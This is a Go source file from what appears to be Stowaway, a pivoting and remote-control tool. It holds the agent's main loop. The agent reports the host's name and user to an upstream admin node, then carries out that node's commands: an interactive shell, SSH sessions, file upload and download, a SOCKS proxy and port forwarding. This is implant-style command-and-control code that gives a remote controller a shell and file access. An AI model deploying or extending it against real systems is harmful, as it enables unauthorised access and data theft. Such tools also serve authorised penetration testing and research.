/*
 * @Author: ph4ntom
 * @Date: 2021-03-10 15:27:30
 * @LastEditors: ph4ntom
 * @LastEditTime: 2021-04-03 13:47:15
 */

package process

import (
	"Stowaway/agent/handler"
	"Stowaway/agent/initial"
	"Stowaway/agent/manager"
	"Stowaway/protocol"
	"Stowaway/share"
	"Stowaway/utils"
	"log"
	"net"
	"os"
)

type Agent struct {
	UUID        string
	Conn        net.Conn
	Memo        string
	UserOptions *initial.Options

	BufferChan chan *BufferData
}

type BufferData struct {
	fHeader  *protocol.Header
	fMessage interface{}
}

func NewAgent(options *initial.Options) *Agent {
	agent := new(Agent)
	agent.UUID = protocol.TEMP_UUID
	agent.UserOptions = options
	agent.BufferChan = make(chan *BufferData, 10)
	return agent
}

func (agent *Agent) Run() {
	component := &protocol.MessageComponent{Secret: agent.UserOptions.Secret, Conn: agent.Conn, UUID: agent.UUID}
	// send agent info first
	agent.sendMyInfo()
	// run manager
	mgr := manager.NewManager(share.NewFile())
	go mgr.Run()
	// run dispatcher expect tcp,cuz tcp dispatcher can not be confirmed because of the username/password changing
	go handler.DispathSocksUDPData(mgr)
	go handler.DispatchForwardData(mgr, component)
	// process data from upstream
	go agent.handleConnFromUpstream(mgr)
	agent.handleDataFromUpstream(mgr, component)
	//agent.handleDataFromDownstream()
}

func (agent *Agent) sendMyInfo() {
	sMessage := protocol.PrepareAndDecideWhichSProtoToUpper(agent.Conn, agent.UserOptions.Secret, agent.UUID)
	header := &protocol.Header{
		Sender:      agent.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.MYINFO,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))), // No need to set route when agent send mess to admin
		Route:       protocol.TEMP_ROUTE,
	}

	hostname, username := utils.GetSystemInfo()

	myInfoMess := &protocol.MyInfo{
		UsernameLen: uint64(len(username)),
		Username:    username,
		HostnameLen: uint64(len(hostname)),
		Hostname:    hostname,
	}

	protocol.ConstructMessage(sMessage, header, myInfoMess)
	sMessage.SendMessage()
}

func (agent *Agent) handleConnFromUpstream(mgr *manager.Manager) {
	rMessage := protocol.PrepareAndDecideWhichRProtoFromUpper(agent.Conn, agent.UserOptions.Secret, agent.UUID)
	for {
		fHeader, fMessage, err := protocol.DestructMessage(rMessage)
		if err != nil {
			log.Println("[*]Peer node seems offline!")
			os.Exit(0)
		}
		agent.BufferChan <- &BufferData{fHeader: fHeader, fMessage: fMessage}
	}
}

func (agent *Agent) handleDataFromUpstream(mgr *manager.Manager, component *protocol.MessageComponent) {
	shell := handler.NewShell()
	mySSH := handler.NewSSH()

	for {
		data := <-agent.BufferChan

		if data.fHeader.Accepter == agent.UUID {
			switch data.fHeader.MessageType {
			case protocol.MYMEMO:
				message := data.fMessage.(*protocol.MyMemo)
				agent.Memo = message.Memo
			case protocol.SHELLREQ:
				go shell.Start(component)
			case protocol.SHELLCOMMAND:
				message := data.fMessage.(*protocol.ShellCommand)
				shell.Input(message.Command)
			case protocol.LISTENREQ:
				//message := fMessage.(*protocol.ListenReq)
				//go handler.StartListen(message.Addr)
			case protocol.SSHREQ:
				message := data.fMessage.(*protocol.SSHReq)
				mySSH.Addr = message.Addr
				mySSH.Method = int(message.Method)
				mySSH.Username = message.Username
				mySSH.Password = message.Password
				mySSH.Certificate = message.Certificate
				go mySSH.Start(component)
			case protocol.SSHCOMMAND:
				message := data.fMessage.(*protocol.SSHCommand)
				mySSH.Input(message.Command)
			case protocol.FILESTATREQ:
				message := data.fMessage.(*protocol.FileStatReq)
				mgr.File.FileName = message.Filename
				mgr.File.SliceNum = message.SliceNum
				err := mgr.File.CheckFileStat(component, protocol.TEMP_ROUTE, protocol.ADMIN_UUID, share.AGENT)
				if err == nil {
					go mgr.File.Receive(component, protocol.TEMP_ROUTE, protocol.ADMIN_UUID, share.AGENT)
				}
			case protocol.FILESTATRES:
				message := data.fMessage.(*protocol.FileStatRes)
				if message.OK == 1 {
					go mgr.File.Upload(component, protocol.TEMP_ROUTE, protocol.ADMIN_UUID, share.AGENT)
				} else {
					mgr.File.Handler.Close()
				}
			case protocol.FILEDATA:
				message := data.fMessage.(*protocol.FileData)
				mgr.File.DataChan <- message.Data
			case protocol.FILEERR:
				mgr.File.ErrChan <- true
			case protocol.FILEDOWNREQ:
				message := data.fMessage.(*protocol.FileDownReq)
				mgr.File.FilePath = message.FilePath
				mgr.File.FileName = message.Filename
				go mgr.File.SendFileStat(component, protocol.TEMP_ROUTE, protocol.ADMIN_UUID, share.AGENT)
			case protocol.SOCKSSTART:
				message := data.fMessage.(*protocol.SocksStart)
				socks := handler.NewSocks(message.Username, message.Password)
				go socks.Start(mgr, component)
			case protocol.SOCKSTCPDATA:
				fallthrough
			case protocol.SOCKSTCPFIN:
				mgr.SocksManager.SocksTCPDataChan <- data.fMessage
			case protocol.UDPASSRES:
				fallthrough
			case protocol.SOCKSUDPDATA:
				mgr.SocksManager.SocksUDPDataChan <- data.fMessage
			case protocol.FORWARDTEST:
				fallthrough
			case protocol.FORWARDSTART:
				fallthrough
			case protocol.FORWARDDATA:
				fallthrough
			case protocol.FORWARDFIN:
				mgr.ForwardManager.ForwardDataChan <- data.fMessage
			case protocol.OFFLINE:
				os.Exit(0)
			default:
				log.Println("[*]Unknown Message!")
			}
		}
	}
}
